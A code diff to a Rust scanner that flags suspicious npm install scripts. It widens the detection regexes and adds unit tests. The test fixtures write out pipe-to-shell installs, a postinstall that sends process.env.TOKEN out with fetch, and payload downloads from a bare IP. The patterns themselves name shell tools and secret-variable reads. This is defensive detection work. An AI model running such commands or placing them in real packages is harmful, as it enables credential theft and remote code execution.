@@ -99,10 +99,11 @@ struct Rule {
 const RULES: &[Rule] = &[
     Rule {
         kind: SuspicionKind::ShellPipe,
-        // `curl …` or `wget …` followed eventually by `| sh|bash|zsh|node`.
-        // `[^\n]*?` keeps the match within one line so multi-line scripts
-        // don't bridge unrelated commands.
-        pattern: r"(?i)\b(?:curl|wget)\b[^\n]*?\|\s*(?:sh|bash|zsh|node)\b",
+        // `curl …` or `wget …` followed eventually by `| sh|bash|zsh|node`,
+        // including the path-qualified variants `| /bin/sh`,
+        // `| /usr/local/bin/bash`, etc. `[^\n]*?` keeps the match within
+        // one line so multi-line scripts don't bridge unrelated commands.
+        pattern: r"(?i)\b(?:curl|wget)\b[^\n]*?\|\s*(?:[/\w]*/)?(?:sh|bash|zsh|node)\b",
     },
     Rule {
         kind: SuspicionKind::EvalDecode,
@@ -116,11 +117,15 @@ const RULES: &[Rule] = &[
     },
     Rule {
         kind: SuspicionKind::SecretEnvRead,
-        // `process.env.X_TOKEN`, `process.env.AWS_SECRET_ACCESS_KEY`,
-        // `process.env.SOMETHING_API_KEY`, etc. The leading
-        // identifier characters keep `process.env.NODE_DEBUG` from
-        // matching by requiring the secret suffix to actually appear.
-        pattern: r"\bprocess\s*\.\s*env\s*\.\s*[A-Z][A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|API_?KEY|ACCESS_KEY|PRIVATE_KEY|AUTH)\b",
+        // `process.env.TOKEN`, `process.env.NPM_TOKEN`,
+        // `process.env.AWS_SECRET_ACCESS_KEY`, etc. The prefix and
+        // suffix character classes are zero-or-more so the bare
+        // keyword form (`process.env.TOKEN`) matches without needing a
+        // surrounding identifier — without that, greedy backtracking
+        // never repositions the alternation onto the keyword's first
+        // character. The keyword still has to appear verbatim, which
+        // keeps `process.env.NODE_DEBUG` from flagging.
+        pattern: r"\bprocess\s*\.\s*env\s*\.\s*[A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|API_?KEY|ACCESS_KEY|PRIVATE_KEY|AUTH)[A-Z0-9_]*\b",
     },
     Rule {
         kind: SuspicionKind::ExfilEndpoint,
@@ -128,7 +133,13 @@ const RULES: &[Rule] = &[
     },
     Rule {
         kind: SuspicionKind::BareIpHttp,
-        pattern: r"https?://(?:\d{1,3}\.){3}\d{1,3}(?:[:/]|$)",
+        // Trailing class catches the post-octet character in every
+        // shape exfil scripts actually use: `/`, `:`, end-of-text,
+        // whitespace (line break or space-delimited curl flag),
+        // quote / paren / `?` / `#`. `.` is intentionally excluded so
+        // DNS hosts that happen to lead with four digit-groups
+        // (`1.2.3.4.example.com`) don't flag.
+        pattern: r#"https?://(?:\d{1,3}\.){3}\d{1,3}(?:[:/\s'"?#)]|$)"#,
     },
 ];
 
@@ -209,6 +220,17 @@ mod tests {
     }
 
     #[test]
+    fn path_qualified_shell_flags() {
+        // `| /bin/sh`, `| /usr/local/bin/bash` etc. are common
+        // exfil-script variants that bypass a bare-name anchor.
+        let m = manifest_with(
+            "postinstall",
+            "curl https://example.com/install.sh | /bin/sh",
+        );
+        assert_eq!(kinds(&sniff_lifecycle(&m)), vec![SuspicionKind::ShellPipe]);
+    }
+
+    #[test]
     fn curl_to_file_does_not_flag_pipe() {
         // `curl -o file.tar.gz` is the prebuild-install / sharp shape —
         // common and benign. Only the pipe-to-shell form should flag.
@@ -283,6 +305,35 @@ mod tests {
     }
 
     #[test]
+    fn process_env_bare_token_flags() {
+        // The bare-keyword form (no surrounding identifier prefix)
+        // is the simplest exfil shape and the one a prefix-greedy
+        // regex would miss via mismatched backtracking.
+        let m = manifest_with(
+            "postinstall",
+            "node -e 'fetch(x, {body: process.env.TOKEN})'",
+        );
+        assert_eq!(
+            kinds(&sniff_lifecycle(&m)),
+            vec![SuspicionKind::SecretEnvRead]
+        );
+    }
+
+    #[test]
+    fn process_env_token_with_trailing_suffix_flags() {
+        // `[A-Z0-9_]*` suffix handles `_VALUE`, `_RAW`, etc. without
+        // breaking the `\b` anchor.
+        let m = manifest_with(
+            "postinstall",
+            "node -e 'console.log(process.env.NPM_TOKEN_VALUE)'",
+        );
+        assert_eq!(
+            kinds(&sniff_lifecycle(&m)),
+            vec![SuspicionKind::SecretEnvRead]
+        );
+    }
+
+    #[test]
     fn process_env_aws_secret_access_key_flags() {
         let m = manifest_with(
             "postinstall",
@@ -347,8 +398,46 @@ mod tests {
     }
 
     #[test]
+    fn bare_ip_no_path_followed_by_flag_flags() {
+        // `curl http://1.2.3.4 -o file` — space terminates the host.
+        let m = manifest_with("install", "curl http://192.0.2.5 -o payload");
+        let k = kinds(&sniff_lifecycle(&m));
+        assert!(k.contains(&SuspicionKind::BareIpHttp));
+    }
+
+    #[test]
+    fn bare_ip_inside_quoted_url_flags() {
+        // `fetch('http://1.2.3.4')` — single-quote terminates the host.
+        let m = manifest_with("postinstall", "fetch('http://192.0.2.5')");
+        let k = kinds(&sniff_lifecycle(&m));
+        assert!(k.contains(&SuspicionKind::BareIpHttp));
+    }
+
+    #[test]
+    fn bare_ip_on_separate_line_flags() {
+        // Multi-line script with the bare IP not at end-of-text —
+        // `$` would miss this without the `\s` branch in the class.
+        let m = manifest_with(
+            "postinstall",
+            "node setup.js\nwget http://192.0.2.5\necho done",
+        );
+        let k = kinds(&sniff_lifecycle(&m));
+        assert!(k.contains(&SuspicionKind::BareIpHttp));
+    }
+
+    #[test]
     fn dns_name_does_not_flag_as_bare_ip() {
         let m = manifest_with("install", "curl http://registry.npmjs.org/path");
+        let k = kinds(&sniff_lifecycle(&m));
+        assert!(!k.contains(&SuspicionKind::BareIpHttp));
+    }
+
+    #[test]
+    fn dns_with_ip_prefix_does_not_flag_as_bare_ip() {
+        // `1.2.3.4.example.com` is a hostname (not a bare IP) and
+        // shouldn't flag — `.` is intentionally not in the trailing
+        // class so the regex declines this shape.
+        let m = manifest_with("install", "curl http://1.2.3.4.example.com/path");
         let k = kinds(&sniff_lifecycle(&m));
         assert!(!k.contains(&SuspicionKind::BareIpHttp));
     }
